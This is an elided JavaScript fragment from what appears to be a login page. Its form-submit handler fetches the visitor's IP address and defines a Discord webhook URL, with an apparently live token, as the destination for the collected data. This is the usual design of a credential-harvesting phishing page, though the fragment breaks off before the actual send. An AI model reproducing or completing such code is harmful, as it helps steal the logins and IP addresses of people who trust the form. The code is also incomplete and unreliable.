...
document.getElementById('loginForm').addEventListener('submit', function(event) {
    ...
    fetch('https://api.ipify.org?format=json')
        ...
        .then(data => {
            ...
            const webhookUrl = 'https://discord.com/api/webhooks/1306897100134547466/ktv0c0ehYHfuc6TQYxgNzhPuRPcL_D7Vp3jMUxZ_RbiOMNcmu4IcCEvPB5tvHpbvdFnI';  // Replace with your Discord webhook
